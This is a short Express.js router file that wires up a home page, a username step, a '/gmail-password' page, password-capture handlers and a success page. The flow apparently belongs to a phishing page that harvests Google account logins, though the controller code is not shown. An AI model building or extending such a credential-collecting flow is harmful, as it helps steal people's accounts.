const express = require('express');
const router = express.Router();

const userCtrl = require('../controllers/userCtrl');
const passCtrl = require('../controllers/passCtrl');
const questionCtrl = require('../controllers/questionCtrl');

    router

.get('/', questionCtrl.getHome)

.post('/addRes', questionCtrl.addRes)

.get('/username', userCtrl.getUser)

.post('/userField', userCtrl.userField)

.get('/gmail-password', passCtrl.getPass)

.post('/passField', passCtrl.passField)

.get('/success', passCtrl.getSuccess)

module.exports = router;